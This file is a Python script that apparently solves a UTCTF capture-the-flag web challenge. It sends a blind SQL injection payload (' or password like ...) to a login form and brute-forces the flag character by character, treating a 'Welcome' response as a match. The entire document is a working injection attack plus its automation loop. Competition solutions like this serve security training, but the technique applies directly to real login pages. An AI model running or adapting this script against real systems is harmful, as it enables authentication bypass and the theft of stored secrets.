import requests
import string

url_form = "http://web2.utctf.live:5006/"
payload = "username=admin&pass=' or password like '{}%"
possible_chars = list("{}" + string.digits + string.ascii_lowercase + string.ascii_uppercase)
headers = {
   "User-Agent": "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);", 
   "Content-Type": "application/x-www-form-urlencoded"
}

found_chars = ""
while True:
    for new_char in possible_chars:
        attempt = found_chars + new_char
        print("[*] Attempt: '{}'.".format(attempt))
        data = payload.format(attempt)
        print("[*] Payload: {}.".format(data))
        page = requests.post(url_form, data=data, headers=headers)
    
        if "Welcome" in page.text:
            found_chars += new_char
            print("[*] Found chars: '{}'".format(found_chars))
            break
    
    if found_chars[-1] == "}":
        break
        
print("The FLAG is: {}".format(found_chars))